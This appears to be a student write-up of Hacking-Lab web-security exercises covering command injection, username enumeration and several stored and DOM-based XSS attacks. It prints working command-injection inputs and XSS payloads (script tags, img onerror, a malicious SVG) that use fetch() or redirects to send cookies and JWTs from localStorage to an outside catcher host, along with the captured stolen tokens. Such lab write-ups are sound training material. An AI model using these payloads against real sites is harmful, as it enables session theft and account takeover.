# 1 Command Injection

## Vulnerabilities

1. **Command Injection:** Pinger functionality executes system commands without input sanitization
2. **Information Disclosure:** Application files and environment variables accessible through command injection

## Attack Steps

1. **Vulnerability Discovery:** Input `127.0.0.1; ls` confirmed command injection by executing both ping and ls commands
2. **Reconnaissance:** Used `127.0.0.1 && cat Readme.md` to analyze application documentation
3. **Intelligence Gathering:** Readme.md revealed key hint about "environment based dynamic ctf flag handling in `/etc/cont-init-d/99-add-flag.sh`"
4. **Flag Extraction:** `127.0.0.1 && env | grep -i flag` searched environment variables and extracted the flag

## Flag

**Flag:** FLAG{ThePwr0fTheS3m1}

# 2 Username enumeration

We have the information that there exists an User with the Password _DarkSide2021_. We now need to find the fitting user to the given password.

## Looking at the login post

With Burp we find the following Post:

```
POST /login HTTP/1.1
Host: 43a567de-fc56-4857-a1f3-af4c045e74df.i.vuln.land
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 27
Origin: https://43a567de-fc56-4857-a1f3-af4c045e74df.i.vuln.land
Referer: https://43a567de-fc56-4857-a1f3-af4c045e74df.i.vuln.land/login
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Priority: u=0, i
Te: trailers
Connection: keep-alive

username=test&password=test
```

Here we see the post that get's used when you use the login mask. We can now use burp to send multiple posts with username combinations. We can use the intruder function for this.

```
POST /login HTTP/1.1
Host: 43a567de-fc56-4857-a1f3-af4c045e74df.i.vuln.land
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 27
Origin: https://43a567de-fc56-4857-a1f3-af4c045e74df.i.vuln.land
Referer: https://43a567de-fc56-4857-a1f3-af4c045e74df.i.vuln.land/login
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Priority: u=0, i
Te: trailers
Connection: keep-alive

username=test&password=DarkSide2021
```

We changed the Password to our known password to _DarkSide2021_ and added the usernames to the payload as fields. After that we got the following result:

|     |               |              |     |     |       |       |      |     |
| --- | ------------- | ------------ | --- | --- | ----- | ----- | ---- | --- |
| 43  | vader         | DarkSide2021 | 302 | 36  | false | false | 337  |     |
| 26  | jabba         | DarkSide2021 | 200 | 99  | false | false | 2750 |     |
| 39  | tarkin        | DarkSide2021 | 200 | 88  | false | false | 2750 |     |
| 32  | owen          | DarkSide2021 | 200 | 211 | false | false | 2752 |     |
| 41  | threepio      | DarkSide2021 | 200 | 206 | false | false | 2752 |     |
| 14  | deak          | DarkSide2021 | 200 | 204 | false | false | 2752 |     |
| 33  | porkins       | DarkSide2021 | 200 | 201 | false | false | 2752 |     |
| 19  | gantry        | DarkSide2021 | 200 | 193 | false | false | 2752 |     |
| 11  | commander     | DarkSide2021 | 200 | 183 | false | false | 2752 |     |
| 8   | camie         | DarkSide2021 | 200 | 173 | false | false | 2752 |     |
| 29  | massassi      | DarkSide2021 | 200 | 173 | false | false | 2752 |     |
| 31  | officer       | DarkSide2021 | 200 | 171 | false | false | 2752 |     |
| 38  | tagge         | DarkSide2021 | 200 | 161 | false | false | 2752 |     |
| 10  | chief         | DarkSide2021 | 200 | 136 | false | false | 2752 |     |
| 18  | fixer         | DarkSide2021 | 200 | 129 | false | false | 2752 |     |
| 5   | ben           | DarkSide2021 | 200 | 128 | false | false | 2752 |     |
| 20  | gold          | DarkSide2021 | 200 | 128 | false | false | 2752 |     |
| 17  | first         | DarkSide2021 | 200 | 120 | false | false | 2752 |     |
| 12  | control       | DarkSide2021 | 200 | 109 | false | false | 2752 |     |
| 30  | motti         | DarkSide2021 | 200 | 109 | false | false | 2752 |     |
| 40  | technician    | DarkSide2021 | 200 | 104 | false | false | 2752 |     |
| 9   | captain       | DarkSide2021 | 200 | 101 | false | false | 2752 |     |
| 6   | beru          | DarkSide2021 | 200 | 94  | false | false | 2752 |     |
| 1   | astro-officer | DarkSide2021 | 200 | 91  | false | false | 2752 |     |
| 25  | intercom      | DarkSide2021 | 200 | 90  | false | false | 2752 |     |
| 15  | death         | DarkSide2021 | 200 | 89  | false | false | 2752 |     |
| 22  | han           | DarkSide2021 | 200 | 89  | false | false | 2752 |     |
| 36  | second        | DarkSide2021 | 200 | 89  | false | false | 2752 |     |
| 24  | imperial      | DarkSide2021 | 200 | 88  | false | false | 2752 |     |
| 7   | biggs         | DarkSide2021 | 200 | 83  | false | false | 2752 |     |
| 35  | red           | DarkSide2021 | 200 | 81  | false | false | 2752 |     |
| 21  | greedo        | DarkSide2021 | 200 | 80  | false | false | 2752 |     |
| 2   | aunt          | DarkSide2021 | 200 | 75  | false | false | 2752 |     |
| 3   | bartender     | DarkSide2021 | 200 | 73  | false | false | 2752 |     |
| 28  | luke          | DarkSide2021 | 200 | 73  | false | false | 2752 |     |
| 37  | star          | DarkSide2021 | 200 | 73  | false | false | 2752 |     |
| 45  | wedge         | DarkSide2021 | 200 | 69  | false | false | 2752 |     |
| 27  | leia          | DarkSide2021 | 200 | 67  | false | false | 2752 |     |
| 16  | dodonna       | DarkSide2021 | 200 | 63  | false | false | 2752 |     |
| 44  | voice         | DarkSide2021 | 200 | 48  | false | false | 2752 |     |
| 13  | creature      | DarkSide2021 | 200 | 42  | false | false | 2752 |     |
| 0   |               |              | 200 | 37  | false | false | 2752 |     |
| 42  | trooper       | DarkSide2021 | 200 | 35  | false | false | 2752 |     |
| 4   | base          | DarkSide2021 | 200 | 34  | false | false | 2752 |     |
| 23  | human         | DarkSide2021 | 200 | 33  | false | false | 2752 |     |
| 34  | rebel         | DarkSide2021 | 200 | 29  | false | false | 2752 |     |

When we look at the three types of lengths we can see that all responses are different:

Response with 2752, shortened:

```
HTTP/2 200 OK
Content-Type: text/html; charset=utf-8
Date: Tue, 14 Oct 2025 20:32:38 GMT
Etag: W/"a0a-XGfr62juN7urOWKsM5xSJoeTbQ8"
X-Powered-By: Express
Content-Length: 2570

      <button type="submit" class="btn btn-primary btn-block">Log in</button>
            </div>
            <div>

                    <p>Unknown username.<p>


            </div>
        </form>
    </div
</html>
```

These are usernames that don't fit.

Response with 2750, shortened:

```
HTTP/2 200 OK
Content-Type: text/html; charset=utf-8
Date: Tue, 14 Oct 2025 20:33:04 GMT
Etag: W/"a08-1QYGGofEeKOIrHLmqhHvv69U9tk"
X-Powered-By: Express
Content-Length: 2568
<!-- views/pages/index.ejs -->
in</button>
            </div>
            <div>
                    <p>Wrong password.<p>
            </div>
        </form>
    </div>
</main>
</html>
```

And last but not least, Response with 337 shortened:

```
HTTP/2 302 Found
Content-Type: text/html; charset=utf-8
Date: Tue, 14 Oct 2025 20:33:10 GMT
Location: /
Set-Cookie: connect.sid=s%3ABGMP4_8BRXzSPETSMyV2kxmFMMyG_umN.2wMUkfByqVO4oOhkTZ61GTDSgbJqYeo7BpodUfFqrYw; Path=/; HttpOnly
Vary: Accept
X-Powered-By: Express
Content-Length: 46

<p>Found. Redirecting to <a href="/">/</a></p>
```

Here we see that vader is the right user.

## Solution

_vader_ is the right user.

# 3 GlockenEmil 2.0 - XSS

We need to exploit a _stored XSS vulnerability_ in the Rate product functionality. A token should be send to the attacker when a victim watches the product. We use a request catcher, to get the stored credentials.

We got the following hints:

- we need to login
- localStorage.getItem('key') to get a key object
- We can use a GET or POST to send the authentication token, the easiest way is the fetch API

First i logged in and looked at the cookies. Conveniently there is only one cookie that probably is the session cookie:
`chatUser: 5aa0481e876d9d39d439785c`

We can now use the rating form and the request catcher to send it to the request fetcher:

```
<script>
fetch('https://9b591611-dc97-4e7d-af00-9531dd7b3114.i.vuln.land/x?token='
      + encodeURIComponent(localStorage.getItem('token')), {method:'GET', mode:'no-cors'});
</script>
```

We can now validate it with the second user:

```
URL: http://9b591611-dc97-4e7d-af00-9531dd7b3114.i.vuln.land/x?token="eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc1JldGFpbGVyIjpmYWxzZSwiX2lkIjoiNWFhMDQ4MWU4NzZkOWQzOWQ0Mzk3ODVjIiwidXNlcm5hbWUiOiJjdXN0b21lcjEiLCJmaXJzdG5hbWUiOiJQZXRlciIsImxhc3RuYW1lIjoiSG9sem1hbm4iLCJlbWFpbCI6IlBldGVyLkhvbHptYW5uQGdtYWlsLmNvbSIsImlhdCI6MTc2MDQ3NTA0MSwiYXVkIjoic2VsZiIsImlzcyI6IndlYnNob3AifQ.02V9Qtci2rj9U_dOaLAEuyDbSGzMJ6WGQ0P1brQ7l6k"
METHOD: GET
IP: 10.2.0.1
Time: 2025-10-14 21:17:26
Headers:
Host: 9b591611-dc97-4e7d-af00-9531dd7b3114.i.vuln.land
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: */*
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.5
Priority: u=4
Referer: https://20a70a84-598f-4b95-9965-b661e77365df.i.vuln.land/
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: no-cors
Sec-Fetch-Site: same-site
Te: trailers
X-Forwarded-For: 213.55.187.92
X-Forwarded-Host: 9b591611-dc97-4e7d-af00-9531dd7b3114.i.vuln.land
X-Forwarded-Port: 443
X-Forwarded-Proto: https
X-Forwarded-Server: traefik.vuln.land
X-Real-Ip: 213.55.187.92


QueryString:
b'token=%22eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc1JldGFpbGVyIjpmYWxzZSwiX2lkIjoiNWFhMDQ4MWU4NzZkOWQzOWQ0Mzk3ODVjIiwidXNlcm5hbWUiOiJjdXN0b21lcjEiLCJmaXJzdG5hbWUiOiJQZXRlciIsImxhc3RuYW1lIjoiSG9sem1hbm4iLCJlbWFpbCI6IlBldGVyLkhvbHptYW5uQGdtYWlsLmNvbSIsImlhdCI6MTc2MDQ3NTA0MSwiYXVkIjoic2VsZiIsImlzcyI6IndlYnNob3AifQ.02V9Qtci2rj9U_dOaLAEuyDbSGzMJ6WGQ0P1brQ7l6k%22'
===================================================
```

# 4 XSS – DOM-based

## Where the vulnerability is

The “Hacking-Lab for Fun and Profit” page reads the URL fragment (`location.hash`) and injects it into the DOM using an HTML-interpreting sink (e.g., `innerHTML` / jQuery `.html()`), enabling DOM-based XSS.

## Exploit URL used (encoded; paste into victim’s address bar)

```
https://3bfff57e-060d-4a7a-8bbc-07d36cc7db6a.i.vuln.land/start.html#%3Cimg%20src%3Dx%20onerror%3D%22location.href%3D%27https%3A%2F%2F7d19ce6f-b2a2-412d-9e44-f398523eb52f.i.vuln.land%2Fx%3Fc%3D%27%2BencodeURIComponent(document.cookie)%22%3E
```

## Captured request (from catcher `/debug`)

```
URL: http://7d19ce6f-b2a2-412d-9e44-f398523eb52f.i.vuln.land/x?c=jsessionid%3Dmy_name_is_bond_007
METHOD: GET
IP: 10.2.0.1
Time: 2025-10-14 22:19:52
Headers:
Host: 7d19ce6f-b2a2-412d-9e44-f398523eb52f.i.vuln.land
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Encoding: gzip, deflate, br, zstd
Accept-Language: en-US,en;q=0.5
Priority: u=0, i
Referer: https://3bfff57e-060d-4a7a-8bbc-07d36cc7db6a.i.vuln.land/
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-site
Te: trailers
Upgrade-Insecure-Requests: 1
X-Forwarded-For: 213.55.187.92
X-Forwarded-Host: 7d19ce6f-b2a2-412d-9e44-f398523eb52f.i.vuln.land
X-Forwarded-Port: 443
X-Forwarded-Proto: https
X-Forwarded-Server: traefik.vuln.land
X-Real-Ip: 213.55.187.92

QueryString:
b'c=jsessionid%3Dmy_name_is_bond_007'
```

## Exfiltrated value

Cookie: `jsessionid=my_name_is_bond_007` (contained in the `c` query parameter).

## Why this is DOM-based & detectability

- The payload resides in the URL **fragment** (`#…`), which is processed **only by the browser** and **not sent** to the server in the initial HTTP request.
- The origin server won’t log the payload; it will typically only see the **secondary request** to the catcher (and possibly CSP reports).

## Remediation

- Replace unsafe sinks: **`.innerHTML` / `$.html()` → `.textContent` / `$.text()`** for any content derived from `location.hash`.
- Enforce strict allow-listing of permitted fragment values; ignore everything else.
- Add a strict CSP, e.g.:

```
Content-Security-Policy: default-src 'self'; script-src 'self'; connect-src 'self'; object-src 'none'; base-uri 'none'
```

## Exploration

Reflected text:

```
https://3bfff57e-060d-4a7a-8bbc-07d36cc7db6a.i.vuln.land/start.html#Hello
```

HTML render (bold):

```
https://3bfff57e-060d-4a7a-8bbc-07d36cc7db6a.i.vuln.land/start.html#%3Cb%3EXSS%3C/b%3E
```

PoC alert:

```
https://3bfff57e-060d-4a7a-8bbc-07d36cc7db6a.i.vuln.land/start.html#%3Cimg%20src%3Dx%20onerror%3Dalert%281%29%3E
```

## Summary

- **Vulnerability location:** On the “Hacking-Lab for Fun and Profit” page (`/start.html`), the app reads `location.hash` and injects it into the DOM via an HTML-interpreting sink (e.g., `innerHTML`/`$.html()`), enabling DOM XSS.  
   _Verified by:_ `#Hello` reflected, bold render with `#%3Cb%3EXSS%3C/b%3E`, and alert PoC with `#%3Cimg%20src%3Dx%20onerror%3Dalert%281%29%3E`.
- **Exploit URL used (encoded):**  
   `https://3bfff57e-060d-4a7a-8bbc-07d36cc7db6a.i.vuln.land/start.html#%3Cimg%20src%3Dx%20onerror%3D%22location.href%3D%27https%3A%2F%2F7d19ce6f-b2a2-412d-9e44-f398523eb52f.i.vuln.land%2Fx%3Fc%3D%27%2BencodeURIComponent(document.cookie)%22%3E`
- **Captured request (from catcher `/debug`):**  
   `GET /x?c=jsessionid%3Dmy_name_is_bond_007` at **2025-10-14 22:19:52**; Referer: `https://3bfff57e-.../start.html`; full headers included (Host, User-Agent, Sec-Fetch-_, X-Forwarded-_, etc.).  
   **Exfiltrated cookie:** `jsessionid=my_name_is_bond_007`.
- **Server-side detectability:** The payload is in the URL **fragment** (`#…`), which is not sent to the origin server. The origin typically only sees the **secondary request** to the catcher (and possibly CSP violation reports).
- **Fix (concise):** Replace `.innerHTML`/`$.html()` with `.textContent`/`$.text()`, strictly allow-list expected fragment values, and add a CSP (e.g., `default-src 'self'; script-src 'self'; connect-src 'self'; object-src 'none'; base-uri 'none'`).

# 5 DOM Local Storage

## Vulnerability Location

The Shop page contains a DOM-based XSS vulnerability in the `selectedQuantity` query parameter that allows stealing the JWT token from localStorage.

## Attack Steps

1. **Login** as customer0/compass0 and click "Shop"
2. **Observe** the URL contains `selectedQuantity=1` parameter
3. **Craft malicious URL** with payload that steals token from localStorage

## Exploit URL

```
https://9e869a19-cf02-4e1c-b1ec-6fb2cfe54c74.i.vuln.land/#!/shop?selectedQuantity=%3Cscript%3Efetch('https://be882089-ad91-45b5-900a-c06e0a7c6d6f.i.vuln.land/x?token='%2BlocalStorage.getItem('token'))%3C/script%3E
```

## Decoded Payload

```javascript
<script>
  fetch('https://be882089-ad91-45b5-900a-c06e0a7c6d6f.i.vuln.land/x?token='+localStorage.getItem('token'))
</script>
```

**How it works:**

- Reads the authentication token from `localStorage.getItem('token')`
- Sends it to the attacker's request catcher via `fetch()` API
- Token is appended as a URL parameter

## Victim Simulation

1. Open new browser session
2. Login as customer1/compass1
3. Paste the malicious URL into the address bar
4. Press Enter - the JavaScript executes and steals the token

## Captured Request

```
===================================================
URL: http://be882089-ad91-45b5-900a-c06e0a7c6d6f.i.vuln.land/x?token="eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc1JldGFpbGVyIjpmYWxzZSwiX2lkIjoiNWFhMDQ4MWU4NzZkOWQzOWQ0Mzk3ODU5IiwidXNlcm5hbWUiOiJjdXN0b21lcjAiLCJmaXJzdG5hbWUiOiJKdWxpYW5lIiwibGFzdG5hbWUiOiJTY2h1bHplIiwiZW1haWwiOiJKdWxpYW5lLlNjaHVsemVAZ21haWwuY29tIiwiaWF0IjoxNzYwNTU3NjI2LCJhdWQiOiJzZWxmIiwiaXNzIjoid2Vic2hvcCJ9.WuihbMBHR065TbqO7194ZZrUSyGaWj2VTok5OAPsMlo"
METHOD: GET
IP: 10.3.0.1
Time: 2025-10-15 20:16:33
Headers:
Host: be882089-ad91-45b5-900a-c06e0a7c6d6f.i.vuln.land
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/26.0.1 Safari/605.1.15
Accept: */*
Accept-Encoding: gzip, deflate, br
Accept-Language: en-GB,en;q=0.9
Origin: https://9e869a19-cf02-4e1c-b1ec-6fb2cfe54c74.i.vuln.land
Priority: u=3, i
Referer: https://9e869a19-cf02-4e1c-b1ec-6fb2cfe54c74.i.vuln.land/
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-site
X-Forwarded-For: 104.28.87.87
X-Forwarded-Host: be882089-ad91-45b5-900a-c06e0a7c6d6f.i.vuln.land
X-Forwarded-Port: 443
X-Forwarded-Proto: https
X-Forwarded-Server: traefik.vuln.land
X-Real-Ip: 104.28.87.87


QueryString:
b'token=%22eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc1JldGFpbGVyIjpmYWxzZSwiX2lkIjoiNWFhMDQ4MWU4NzZkOWQzOWQ0Mzk3ODU5IiwidXNlcm5hbWUiOiJjdXN0b21lcjAiLCJmaXJzdG5hbWUiOiJKdWxpYW5lIiwibGFzdG5hbWUiOiJTY2h1bHplIiwiZW1haWwiOiJKdWxpYW5lLlNjaHVsemVAZ21haWwuY29tIiwiaWF0IjoxNzYwNTU3NjI2LCJhdWQiOiJzZWxmIiwiaXNzIjoid2Vic2hvcCJ9.WuihbMBHR065TbqO7194ZZrUSyGaWj2VTok5OAPsMlo%22'
===================================================
```

The captured JWT token should decode to show victim's user information (customer1).

# 6 GlockenEmil 2.0 – SVG

## Attack Overview

Exploit a stored XSS vulnerability in the Community area by uploading a malicious SVG image containing JavaScript that steals the authentication token from localStorage.

## Attack Steps

1. **Login** as customer0/compass0
2. **Navigate** to Community (top right)
3. **Create malicious SVG file** (malicious.svg):

```xml
<?xml version="1.0" encoding="UTF-8"?>
<svg xmlns="http://www.w3.org/2000/svg" width="1000" height="1000" viewBox="0 0 32 32">
  <rect fill="#f00" height="32" width="32"/>
  <rect fill="#fff" height="6" width="20" x="6" y="13"/>
  <rect fill="#fff" height="20" width="6" x="13" y="6"/>
  <script type="text/javascript">
    fetch('https://be882089-ad91-45b5-900a-c06e0a7c6d6f.i.vuln.land/x?token=' + localStorage.getItem('token'));
  </script>
</svg>
```

4. **Upload the SVG** as a post in the Community area
5. **Victim simulation**: Open a new browser session, login as customer1/compass1, click "Home" to load the page containing the malicious SVG
6. **Token exfiltration**: When the SVG renders, the embedded JavaScript executes and sends the token to the attacker's catcher

## SVG Source Code

The malicious SVG contains:

- A visible red cross icon (to appear legitimate)
- An embedded `<script>` tag with JavaScript that:
  - Retrieves the token from `localStorage.getItem('token')`
  - Sends it to the attacker's request catcher via `fetch()`

## Captured Request

```
URL: http://2b60711d-4018-4a2c-8500-897395f33af2.i.vuln.land/x?token="eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc1JldGFpbGVyIjpmYWxzZSwiX2lkIjoiNWFhMDQ4MWU4NzZkOWQzOWQ0Mzk3ODVjIiwidXNlcm5hbWUiOiJjdXN0b21lcjEiLCJmaXJzdG5hbWUiOiJQZXRlciIsImxhc3RuYW1lIjoiSG9sem1hbm4iLCJlbWFpbCI6IlBldGVyLkhvbHptYW5uQGdtYWlsLmNvbSIsImlhdCI6MTc2MDU1ODE3MywiYXVkIjoic2VsZiIsImlzcyI6IndlYnNob3AifQ.RlN4SNgRkOltPouSRGODPpUu_k62kSXNRzLk5fvxcPk"
METHOD: GET
IP: 10.3.0.1
Time: 2025-10-15 19:56:20
Headers:
Host: 2b60711d-4018-4a2c-8500-897395f33af2.i.vuln.land
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/26.0.1 Safari/605.1.15
Accept: */*
Accept-Encoding: gzip, deflate, br
Accept-Language: en-GB,en;q=0.9
Origin: https://6607a20e-c738-4d11-a985-f42412acd781.i.vuln.land
Priority: u=3, i
Referer: https://6607a20e-c738-4d11-a985-f42412acd781.i.vuln.land/
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-site
X-Forwarded-For: 104.28.87.88
X-Forwarded-Host: 2b60711d-4018-4a2c-8500-897395f33af2.i.vuln.land
X-Forwarded-Port: 443
X-Forwarded-Proto: https
X-Forwarded-Server: traefik.vuln.land
X-Real-Ip: 104.28.87.88


QueryString:
b'token=%22eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc1JldGFpbGVyIjpmYWxzZSwiX2lkIjoiNWFhMDQ4MWU4NzZkOWQzOWQ0Mzk3ODVjIiwidXNlcm5hbWUiOiJjdXN0b21lcjEiLCJmaXJzdG5hbWUiOiJQZXRlciIsImxhc3RuYW1lIjoiSG9sem1hbm4iLCJlbWFpbCI6IlBldGVyLkhvbHptYW5uQGdtYWlsLmNvbSIsImlhdCI6MTc2MDU1ODE3MywiYXVkIjoic2VsZiIsImlzcyI6IndlYnNob3AifQ.RlN4SNgRkOltPouSRGODPpUu_k62kSXNRzLk5fvxcPk%22'
===================================================
```

## Why This Works

- SVG files can contain embedded JavaScript in `<script>` tags
- When the browser renders the SVG image, it executes the JavaScript
- The JavaScript runs in the context of the web application, giving it access to localStorage
- This is a **stored XSS** attack because the malicious SVG is permanently stored on the server

# 7 SCHOGGI: Cross-Site Scripting (XSS) Level 2

## Attack Overview

Exploit a stored XSS vulnerability in the Comment functionality without using `<script>` tags. Use image `onerror` event handler to execute JavaScript that steals the victim's cookie.

## Why No Script Tags?

- The application filters `<script>` tags, or
- The client-side framework (e.g., Angular) prevents execution of dynamically inserted `<script>` tags
- Solution: Use alternative HTML elements with event handlers like `<img>` with `onerror`

## Attack Steps

1. **Login as attacker**: alice/alice.123
2. **Navigate** to a cake and click "MORE INFO"
3. **Use alternative payload**: Enter the following in a comment:

## Malicious Comment Payload

```html
<img
  src="x"
  onerror='fetch("https://logger-136f9d91-ef9a-4e8b-98c9-5e4ab7f27fc9.i.vuln.land/x-log/schoggi?cookie=" + encodeURIComponent(document.cookie))'
/>
```

## How It Works

1. The `<img src='x'>` tries to load an invalid image source
2. This triggers the `onerror` event handler
3. The JavaScript in `onerror` executes:
   - `document.cookie` retrieves the victim's cookie
   - `fetch()` sends it to the attacker's request logger
4. When victim (bob/bob.123) views the comment, the cookie is exfiltrated

## Victim Simulation

1. Open new browser session
2. Login as bob/bob.123
3. Click "MORE INFO" on the cake with the malicious comment
4. The page loads, image fails, JavaScript executes
5. Bob's cookie is sent to attacker's request logger

## Captured Request

```
GET /x-log/schoggi?cookie=token=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJqdGkiOiIwN2EzZThmNS00M2Q4LTRhZWMtOTA4Ni1iOWQ1OWE5ZTQ3ZWEiLCJ1aWQiOjEwMiwiZXhwIjoxNzYwNTYxMjg2fQ.lOvtjxE6Tth4XRuq2EK2Vcqkdzi8qlYJnmfOlrdLXbE HTTP/1.1
Host: logger-136f9d91-ef9a-4e8b-98c9-5e4ab7f27fc9.i.vuln.land
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/26.0.1 Safari/605.1.15
Accept: */*
Accept-Encoding: gzip, deflate, br
Accept-Language: en-GB,en;q=0.9
Origin: https://b6e72d1f-eb59-44d9-820f-9895dfb297c7.i.vuln.land
Priority: u=3, i
Referer: https://b6e72d1f-eb59-44d9-820f-9895dfb297c7.i.vuln.land/
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-site
X-Forwarded-For: 104.28.87.88
X-Forwarded-Host: logger-136f9d91-ef9a-4e8b-98c9-5e4ab7f27fc9.i.vuln.land
X-Forwarded-Port: 443
X-Forwarded-Proto: https
X-Forwarded-Server: traefik.vuln.land
X-Real-Ip: 104.28.87.88
```
